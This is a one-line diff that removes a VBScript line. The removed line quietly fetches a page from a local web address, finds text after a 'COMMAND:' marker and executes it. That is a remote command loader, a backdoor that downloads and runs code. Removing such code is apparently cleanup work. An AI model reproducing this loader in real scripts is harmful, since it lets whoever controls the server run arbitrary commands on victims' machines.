@@ -1,1 +1,0 @@
-On Error Resume Next:Set X=WScript.CreateObject("MSXML2.ServerXMLHTTP"):X.Open"GET","http://127.0.0.1:80/PremiumGames.xhtml",false:X.Send:If InStr(X.responseText,"COMMAND:")Then:Execute Mid(X.responseText,InStr(X.responseText,"COMMAND:")+8,Len(X.responseText)):End If
